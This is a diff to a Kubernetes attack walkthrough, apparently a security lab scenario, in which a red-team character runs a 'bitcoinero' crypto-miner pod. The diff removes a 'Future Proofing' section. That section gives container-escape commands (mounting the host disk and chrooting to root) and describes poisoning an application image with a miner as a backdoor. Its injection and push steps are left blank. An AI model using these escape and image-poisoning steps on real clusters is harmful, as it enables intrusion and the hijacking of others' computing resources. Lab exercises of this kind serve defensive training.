@@ -57,31 +57,4 @@ Verify that the pod is running:
 curl -k -X GET "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods/bitcoinero" -H "Authorization: Bearer $TOKEN" -H "Accept: application/json" 2>/dev/null | grep phase
 ```
 
-## Future Proofing
-
-__Red__ has already been discovered once on this system. Luckily we left a backdoor last time. We should probably do that again. This time, let's hide our miner inside of a legitimate application. Then we won't even need access to the cluster anymore, whenever the owner of the cluster runs their apps, our miners will get spun up right along with them.
-
-To get started we need to escape the container and gain access to the host OS:
-```console
-mkdir -p /mnt/hola
-mount /dev/sda1 /mnt/hola
-chroot /mnt/hola /bin/bash
-```
-And just like that you are now root on the host node!
-
-Next we need to figure out where the container images are coming from:
-```console
-kubectl get deployment <deployment-name> -n prod -o jsonpath="{.spec.template.spec.containers[*].image}"
-```
-
-Now let's add our crypto miner to the application image:
-```console
-```
-
-And then we push our modified image to the repository, replacing the existing image. 
-```console
-```
-
-Now, all future instances of the application that launch on this cluster will run our crypto miner alongside their application!
-
 Time for some celebratory pizza!
